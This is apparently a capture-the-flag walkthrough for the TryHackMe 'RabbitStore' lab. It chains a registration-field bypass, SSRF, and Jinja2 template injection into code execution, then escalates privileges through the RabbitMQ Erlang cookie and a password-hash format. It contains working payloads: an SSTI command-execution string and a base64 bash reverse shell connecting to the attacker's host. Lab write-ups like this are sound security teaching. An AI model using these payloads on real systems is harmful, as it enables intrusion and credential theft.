# TryHackMe — RabbitStore (Medium) Walkthrough

> Room: **RabbitStore** (Medium)  
> Goal: Get initial access, then escalate to root.

---

## 1) Recon

### 1.1 Port scan (Nmap)

Run a full TCP scan with default scripts + version detection:

```/dev/null#L1-1
nmap -p- -sC -sV -T4 --min-rate=1000 <IP_ADDRESS>
```

**Flags used**
- `-p-`: scan all ports (1–65535)
- `-sC`: run default Nmap scripts
- `-sV`: detect service versions
- `-T4`: faster timing template
- `--min-rate=1000`: send at least 1000 packets/sec

### 1.2 Results (important ports)

The scan shows:

- `22/tcp` — SSH (OpenSSH 8.9p1)
- `80/tcp` — HTTP (Apache 2.4.52) redirecting to `http://cloudsite.thm/`
- `4369/tcp` — `epmd` (Erlang Port Mapper Daemon)
- `25672/tcp` — RabbitMQ-related (Erlang distribution / RabbitMQ node comms)

**Takeaway:** Besides web + SSH, the presence of `epmd` + RabbitMQ ports suggests an Erlang/RabbitMQ angle for privilege escalation later.

---

## 2) Web access (fix DNS / hosts)

When browsing the site initially, pages failed to resolve because the app expects hostnames.

Add these entries to your `/etc/hosts` on your attacking machine:

```/dev/null#L1-3
<TARGET_IP> cloudsite.thm
<TARGET_IP> storage.cloudsite.thm
```

Then visit:
- `http://cloudsite.thm/`
- `http://storage.cloudsite.thm/`

---

## 3) Auth bypass via registration request manipulation (JWT / subscription)

### 3.1 Observing the behavior

The app has a login form, but a normal login doesn’t allow actions; it complains you need to be “subscribed”.

A JWT is used (cookie named `jwt`). The token contains a `subscription` field.

### 3.2 Finding the weakness

Instead of trying to forge the JWT directly, intercept the **registration** request in Burp Suite.

The registration request only sends:
- `email`
- `password`

No `subscription` field is present.

### 3.3 Exploit: add `subscription=active`

Modify the registration request by adding:

- `"subscription": "active"`

If the server accepts it, your newly created user is treated as subscribed and you gain access to additional functionality (including an upload-from-URL feature).

---

## 4) Upload-from-URL → SSRF

### 4.1 What you have

After becoming “active”, you get a feature that uploads content **from a URL** and then returns a link under an `/uploads` endpoint.

This is a classic place to test for **SSRF (Server-Side Request Forgery)**.

> SSRF allows you to make the server perform HTTP requests to internal services (localhost / internal ports), potentially exposing internal admin apps, metadata services, or other sensitive endpoints.

### 4.2 Confirm SSRF with your attacker machine

Host a simple file (example: `test.txt`) on your machine and provide your URL to the upload-from-URL feature.  
If you receive a working uploaded link back, SSRF-style fetching works.

### 4.3 Pivot SSRF to localhost

Change the supplied URL to point to the target’s localhost:

- `http://localhost/`

If it returns HTML content from the local web service, you have confirmed you can reach internal services.

### 4.4 Finding internal app ports

Try common internal web ports. In this box, checking `localhost:3000` is useful (common for Express apps).

By fetching internal content from `http://localhost:3000`, you can discover new endpoints, including:

- `/api/fetch_messeges_from_chatbot`

(Spelling matches the target endpoint name.)

---

## 5) SSTI in `/api/fetch_messeges_from_chatbot` → RCE

### 5.1 Endpoint behavior

Send a request to the endpoint. It requires a `username` parameter. Example request:

```/dev/null/request.txt#L1-18
POST /api/fetch_messeges_from_chatbot HTTP/1.1
Host: storage.cloudsite.thm
Content-Type: application/json
Cookie: jwt=<YOUR_JWT>
Connection: close

{"username":"test"}
```

The page responds indicating the chatbot is under development.

### 5.2 Test for template injection

Try a simple expression payload:

```/dev/null#L1-1
{"username":"{{3*3}}"}
```

If the response includes `9`, the input is being evaluated server-side, consistent with **SSTI** (likely Jinja2-style).

### 5.3 Escalate SSTI → command execution

A known Jinja2-style payload for command execution is:

```/dev/null#L1-1
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

If that returns command output, you have RCE.

---

## 6) Get a reverse shell

### 6.1 Prepare your listener

On your attacking machine:

```/dev/null#L1-1
nc -lvnp 4444
```

### 6.2 Use a base64-encoded bash reverse shell

Encode this (replace `<YOUR_IP>` and port as needed):

```/dev/null#L1-1
bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1
```

Then send the payload through SSTI using `os.popen`, decoding and executing:

```/dev/null#L1-1
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo <BASE64_PAYLOAD> | base64 -d | bash').read() }}
```

Once it connects back, you should have a shell as the low-privilege user (in this box, that user is `azrael`).

---

## 7) Stabilize your shell

Common upgrades (pick one):

### Option A: Python PTY

```/dev/null#L1-1
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Option B: `stty` trick

1. Background the shell:
```/dev/null#L1-1
Ctrl+Z
```

2. Fix your local terminal:
```/dev/null#L1-1
stty raw -echo; fg
```

3. Set terminal type:
```/dev/null#L1-1
export TERM=xterm
```

---

## 8) User flag

After landing a shell, locate the user flag. In this box it is located in:

- `/home/azrael/`

---

## 9) Privilege escalation: RabbitMQ / Erlang cookie (EPMD)

During enumeration (e.g., with `linpeas`), you may notice RabbitMQ’s Erlang services are reachable. RabbitMQ nodes authenticate using a shared secret called the **Erlang cookie**. If you can obtain the cookie, you can query/manage the node using RabbitMQ tooling.

### 9.1 Why this matters

RabbitMQ is built on Erlang distribution:
- `epmd` helps locate Erlang nodes
- nodes authenticate with the **cookie**
- if you have the correct cookie + node name resolves, you can run administrative queries

Key point:
- **Cookie = shared secret** for Erlang distribution authentication.

### 9.2 Ensure the node name resolves (attacker machine)

RabbitMQ nodes often look like `rabbit@forge`. The hostname portion (`forge`) must resolve.

Add to your attacker `/etc/hosts`:

```/dev/null#L1-1
<TARGET_IP> forge
```

### 9.3 Find the Erlang cookie on the target

On the compromised machine, check common cookie locations:

- `~/.erlang.cookie`
- `/var/lib/rabbitmq/.erlang.cookie`
- `/root/.erlang.cookie` (usually not readable)

You need the cookie that corresponds to the RabbitMQ node you want to query (commonly the rabbitmq service user’s cookie).

### 9.4 Query the RabbitMQ node with `rabbitmqctl`

From a machine that has `rabbitmqctl` available (attacker machine, or target if present), query the node. Example:

```/dev/null#L1-1
sudo rabbitmqctl --erlang-cookie 'YOUR_COOKIE_HERE' --node rabbit@forge list_users
```

This should list RabbitMQ users. In this box, you should find an administrator account and a value that looks like a password hash (often base64-encoded data).

---

## 10) Understanding the RabbitMQ password hash format

RabbitMQ can store password hashes in a format that looks like a base64 blob. Conceptually:

- `base64( salt(4 bytes) + sha256( salt(4 bytes) + password ) )`

So when you base64-decode the stored value, the resulting bytes are:

1. First **4 bytes**: salt  
2. Remaining bytes: SHA-256 digest

### 10.1 Extract the salt (first 4 bytes)

If you saved the base64 blob into `password.txt`:

```/dev/null#L1-1
cat password.txt | base64 -d | xxd -p -c 100
```

This prints decoded bytes in hex. The salt is the first 4 bytes = first **8 hex characters**.

Example (conceptual):
- decoded hex: `a1b2c3d4<rest_of_digest...>`
- salt hex: `a1b2c3d4`

From here you can follow the intended path for the room to recover the password (commonly by recomputing the hash for guesses and comparing, or by using a small script with a wordlist if the password is weak).

---

## 11) Become root

Once you recover the administrator/root password:

```/dev/null#L1-2
su root
# enter recovered password
```

Then read the root flag:

- `/root/root.txt`

---

## 12) Notes / reminders

- Hostnames matter in this room (`cloudsite.thm`, `storage.cloudsite.thm`, and later `forge`).
- The initial foothold comes from chaining **SSRF → internal endpoint discovery → SSTI → RCE**.
- The privilege escalation path leverages **RabbitMQ/Erlang cookie authentication** to extract credentials.

---